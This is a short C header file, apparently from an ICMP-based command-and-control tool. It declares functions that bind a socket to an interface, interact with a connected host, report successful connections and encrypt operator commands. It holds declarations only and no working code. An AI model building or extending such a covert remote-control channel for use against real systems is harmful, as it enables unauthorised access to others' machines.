#ifndef C2_H
#define C2_H
#include <stdint.h>
#include <netinet/ip_icmp.h>

void c2_init_n_call(char *interface_to_bind);
int create_socket(char *inteface_to_bind);
void interact(int sockfd);
void print_connection_succeed(char *src_ip);
int get_command(char *input, unsigned char *cipher_text);
#endif